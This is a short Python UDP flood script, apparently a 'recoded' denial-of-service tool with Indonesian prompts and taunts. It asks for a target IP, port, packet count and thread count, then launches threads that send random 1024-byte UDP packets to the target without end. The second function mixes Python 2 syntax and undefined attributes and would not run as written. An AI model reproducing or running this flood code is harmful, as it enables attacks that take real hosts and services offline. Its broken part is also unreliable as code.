#!/usr/bin/env python3
#Code by LeeOn123 Recode Dikz
import random
import socket
import threading
import random
import sys

print("--> ♕Ðikzxz♕ <--")
print("#-- Author Leoon123 Recode By Dikz  --#")
ip = str(input(" IP TARGET LU:"))
port = int(input(" Port:"))
choice = str(input(" Yakin Dihancurin?(y/n):"))
times = int(input(" Jumlah Paket:"))
threads = int(input(" Paket Ahsiap:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[ZXZ]","[ZXZ]","[ZXZ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" MAMPUS LU AJG ")
		except:
			print("[!] Yah abiss")

def run2():
	def run(self):
         print "Dikz In Here " + self.ip + ":" + str(self.port) + "bapa lo anjing"
         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
         bytes = random._urandom(self.psize)
         while True:
             sock.sendto(str(ip),int(port)
 
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
